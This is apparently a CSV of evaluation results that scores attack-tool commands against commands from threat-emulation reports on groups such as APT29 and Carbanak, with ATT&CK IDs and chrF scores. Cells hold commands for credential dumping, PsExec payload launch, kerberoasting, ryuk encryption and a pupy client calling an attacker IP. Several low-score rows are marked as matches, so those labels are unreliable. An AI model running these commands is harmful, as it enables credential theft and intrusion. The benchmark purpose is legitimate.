report,file,tool,input_command,matched_command,chrf_score,match_found
AnotherVictim_FIN6,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
AnotherVictim_FIN6,command_psexec_TA0002_T1059.txt,psexec,"psexec \\target_system -accepteula -nobanner cmd /c ""notepad.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","27,857",True
BITDEFENDER_CARBANAK,command_adfind_TA0007_T1083.txt,adfind,adfind -sc adobjcnt:user,"adfind -f ""(objectcategory=group)""`","30,039",True
BITDEFENDER_CARBANAK,command_pupy_TA0001_T1078.txt,pupy,creddump -o C:\Users\adm_admin\AppData\Roaming\Microsoft\Credentials,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","38,887",True
BITDEFENDER_CARBANAK,command_pupy_TA0002_T1059.txt,pupy,beroot --target <windows|linux>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"24,025",True
BITDEFENDER_CARBANAK,command_rubeus_TA0005_T1070.txt,rubeus,Rubeus.exe triage /luid:<placeholder>,`rubeus.exe kerberoast /domain:oz.local`,"26,927",True
BITDEFENDER_CARBANAK,command_wmic_TA0007_T1082.txt,wmic,wmic computersystem get /value,"`wmic /node:#{""POS system""} process call create #{""executable""}`","24,39",True
COSMIC_APT29,command_adfind_TA0005_T1036.txt,adfind,"adfind -b <domain_controller> -f ""(|(name=<malicious_file_name>.jpg)(name=<malicious_file_name>.doc))"" -d ""JPEG Photo""",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,"11,814",True
COSMIC_APT29,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
COSMIC_APT29,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe --encrypt,`ryuk.exe --encrypt --process-name notepad.exe`,"72,768",True
COZY2_APT29,command_wmic_TA0002_T1047.txt,wmic,"wmic /node:<target_computer> /namespace:\\root\cimv2 path Win32_Process call Create,CommandLine=""calc.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","24,287",True
COZY_APT29,command_adfind_TA0005_T1036.txt,adfind,"adfind -sddl+++ -resolvesids -sdpipe+x -where ""(&(objectCategory=computer)(dn=<pandora_music_streaming_service_dns>))""",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"25,741",True
COZY_APT29,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
CrashOverride_SANDWORM,command_psexec_TA0040_T1489.txt,psexec,"psexec \\remote_system -l -accepteula -nobanner cmd /c ""sc stop <service_name>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","25,864",True
CrashOverride_SANDWORM,command_ryuk_TA0002_T1053.txt,ryuk,ryuk.exe /schtasks,`ryuk.exe --encrypt --process-name notepad.exe`,"30,861",True
CrashOverride_SANDWORM,command_ryuk_TA0003_T1543.txt,ryuk,ryuk.exe /p <persist_file_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"24,639",True
CrashOverride_SANDWORM,command_ryuk_TA0004_T1543.txt,ryuk,ryuk.exe /target:C:\Windows\System32\services.exe,`ryuk.exe --encrypt --process-name notepad.exe`,"23,239",True
CROWD_APT29,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
wce.exe -w
```","33,601",True
CROWD_APT29,command_wmic_TA0002_T1047.txt,wmic,"wmic /NAMESPACE:""root\cimv2"" /ROLE:__elah! /NODE:<computer_name> PROCESS CREATE <namespace_path>\Win32_Process.StartService","`wmic /node:#{""POS system""} process call create #{""executable""}`","11,181",True
CROWD_APT29,command_wmic_TA0007_T1518.txt,wmic,wmic SYSDRIVER list /format:list,"`wmic /node:#{""POS system""} process call create #{""executable""}`","12,627",True
CROWD_CARBANAK,command_adfind_TA0007_T1082.txt,adfind,adfind -sc sdump,"adfind -f ""(objectcategory=group)""`","31,38",True
CROWD_CARBANAK,command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
CROWD_CARBANAK,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Embed -OutputPath <obfuscated_file_path> -InputFile <original_file_path>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"23,677",True
